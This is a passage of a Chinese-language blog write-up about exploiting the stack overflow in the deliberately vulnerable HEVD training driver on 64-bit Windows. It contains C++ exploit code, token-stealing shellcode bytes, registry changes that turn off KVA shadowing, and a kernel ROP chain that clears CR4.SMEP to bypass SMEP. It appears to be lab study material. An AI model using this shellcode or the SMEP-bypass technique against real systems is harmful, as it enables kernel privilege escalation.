class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">		<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	STARTUPINFOA si;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode;</span><br><span class="line"></span><br><span class="line">	DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>(shellcode, <span class="number">256</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(STARTUPINFOA);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">true</span>, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] FATAL: Error spawning cmd.exe\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Updating our shellcode to search for PID %d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">	*(DWORD*)((<span class="type">char</span>*)shellcode + <span class="number">27</span>) = pi.dwProcessId;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">		stackspace, size,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118002020265.png" alt="image-20240118002020265" /></p>
<p>然后到ret返回，查看返回地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k</span><br></pre></td></tr></table></figure>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118002154225.png" alt="image-20240118002154225" /></p>
<p>发现返回地地址已经被覆盖了，继续走下去</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118002325326.png" alt="image-20240118002325326" /></p>
<p>跳转到了shellcode了，再走两步</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118002504625.png" alt="image-20240118002504625" /></p>
<p>？？？</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118002613223.png" alt="image-20240118002613223" /></p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118003040168.png" alt="image-20240118003040168" /></p>
<p>说我在执行不可执行的内存，但是明明已经<code>VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</code></p>
<p>？？？越来越离谱了</p>
<p>尝试把shellcode移动到常量内存中试试，还是不行，接着我再进行ioctl之前pause一下，好像可以了</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118013041535.png" alt="image-20240118013041535" /></p>
<p>但是依然被说执行不可执行代码</p>
<h1 id="新的保护机制"><a class="markdownIt-Anchor" href="#新的保护机制"></a> 新的保护机制</h1>
<p>查了<a target="_blank" rel="noopener" href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">其他的解法</a>，发现Windows 8过后微软添加了一个叫做SMEP保护的东西</p>
<p>你可以在这里查到关于Windows的所有保护机制：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p>
<blockquote>
<ul>
<li><strong>监督器模式执行防护 (SMEP)</strong> ：帮助防止内核 (“监督器”) 在用户页面中执行代码，这是攻击者用于本地内核提升特权 (EOP) 的常见技术。 此配置需要在 Intel Ivy Bridge 或更高版本处理器中找到处理器支持，或者具有 PXN 支持的 ARM。</li>
</ul>
</blockquote>
<p>尝试关闭该保护后执行exp，<strong>但是发现是无法关闭的</strong>，由于内核的整体设计导致该保护在windows8及以上是不能被关闭的，那么就只能想办法绕过了</p>
<h2 id="a-smep保护机制及手动绕过"><a class="markdownIt-Anchor" href="#a-smep保护机制及手动绕过"></a> A. SMEP保护机制及手动绕过</h2>
<p>该保护机制强烈依赖于CPU的<code>RC4</code>寄存器，刚好我这里有《英特尔® 64 位和 IA-32 架构开发人员手册合订本》，翻出来看一下</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118103701065.png" alt="image-20240118103701065" /></p>
<blockquote>
<p>[机翻]从用户模式地址获取指令。<br />
访问权限取决于 CR4.SMEP 的值：<br />
• 如果CR4.SMEP = 0，访问权限取决于分页模式和IA32_EFER.NXE 的值：<br />
— 对于 32 位分页或如果 IA32_EFER.NXE = 0，则可以从任何用户模式获取指令<br />
地址。<br />
— 对于 IA32_EFER.NXE = 1 的其他分页模式，可以通过每个分页结构条目中 XD 标志为 0 的转换从任何用户模式地址获取指令<br />
控制翻译； 指令可能无法从任何用户模式地址获取<br />
在任何控制转换的分页结构条目中 XD 标志为 1 的转换。<br />
• 如果CR4.SMEP = 1，则不能从任何用户模式地址获取指令。<br />
— 仅允许对管理员模式影子堆栈地址进行管理员模式影子堆栈访问<br />
（往上看）。</p>
</blockquote>
<p>或许我们将<code>CR4.SMEP</code>的值设置为<code>0</code>，访问权限由页中的U/S标志位决定</p>
<p>CR4寄存器的结构如下（小端序顺序从右向左）：</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118105721560.png" alt="image-20240118105721560" /></p>
<p>不急，继续搜索发现了一份Intel关于SMEP的更详细的描述</p>
<p>文档：<a target="_blank" rel="noopener" href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p>
<p>尝试使用调试起修改CR4</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118110623235.png" alt="image-20240118110623235" /></p>
<p>如果修改第20位为0，rc的值为<code>0x270678</code>，然而还是不行</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118131258807.png" alt="image-20240118131258807" /></p>
<h2 id="b-kvas"><a class="markdownIt-Anchor" href="#b-kvas"></a> B. KVAS</h2>
<p>Windows内核缓解机制使用了Kva Shadow内存，比如MeltDown漏洞就于此有关，首先不会讲细节，<strong>在下一篇文章会讲到</strong>，尝试将其关闭</p>
<p>再注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management</code></p>
<p>创建两个DWORD值：<code>FeatureSettingsOverride </code>  <code>FeatureSettingsOverrideMask</code></p>
<p>设置值为3，然后重启</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118140220468.png" alt="image-20240118140220468" /></p>
<p>现在手动设置cr4.SMEP为0</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118141040651.png" alt="image-20240118141040651" /></p>
<p>终于运行了</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118141139354.png" alt="image-20240118141139354" /></p>
<p>shellcode的一些偏移有问题</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118142143111.png" alt="image-20240118142143111" /></p>
<p>更换为</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">	<span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line">	<span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>EXP</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	DWORD oldProtect;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">	LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line">		<span class="built_in">sizeof</span>(cmd),</span><br><span class="line">		MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"></span><br><span class="line">	DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;shellcode space %p\n&quot;</span>, shellcode_addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">		stackspace, size,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试中手动CR4.SMEP=0（注意，之前已经关闭了KVA）</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5C22e93130a64847e0492c0c66e33bd565.png" alt="img" /></p>
<h2 id="c-使用内核rop绕过smep"><a class="markdownIt-Anchor" href="#c-使用内核rop绕过smep"></a> C. 使用内核ROP绕过SMEP</h2>
<p>首先我们需要一个类似于<code>mov rc4,xxx</code>的rop，让<code>rc4.smep=0</code>，</p>
<p>参考在Linux下进行ROP的经验， payload大致长这样的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;	<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_rc4_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure>
<p>多调试或者编程自动寻找就可以找到了，这里暂时参考<a target="_blank" rel="noopener" href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">HEVD Exploits – Windows 10 x64 Stack Overflow SMEP Bypass</a></p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118154417340.png" alt="image-20240118154417340" /></p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118154352984.png" alt="image-20240118154352984" /></p>
<p>修改EXP</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x840</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807743f52c0</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;	<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807749a41cf</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>没有下断点直接过</p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118154931459.png" alt="image-20240118154931459" /></p>
<p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cwin-hevd-exp-stackoverflow-II.assets%5Cimage-20240118154854993.png" alt="image-20240118154854993" /></p>
<h1 id="遗留"><a class="markdownIt-Anchor" href="#遗留"></a> 遗留</h1>
<p>下一篇</p>
<ul>
<li>user编程寻找ROPGadget</li>
<li>shellcode编写</li>
<li>Token提权</li>
<li>KVAS</li>
</ul>
<h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pD4y1a7hP/">https://www.bilibili.com/video/BV1pD4y1a7hP/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html">https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.xpnsec.com/hevd-stack-overflow">https://blog.xpnsec.com/hevd-stack-overflow</a></p>
<p><a target="_blank" rel="noopener" href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit">https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit</a></p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p>
<p><a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/</a></p>
<p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://wumb0.in/windows-10-kvas-and-software-smep.html">https://wumb0.in/windows-10-kvas-and-software-smep.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/xct/windows-kernel-exploits/">https://github.com/xct/windows-kernel-exploits/</a></p>
</div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
(function () {
  var dsq = document.createElement('script');
  dsq.type = 'text/javascript';
  dsq.async = true;
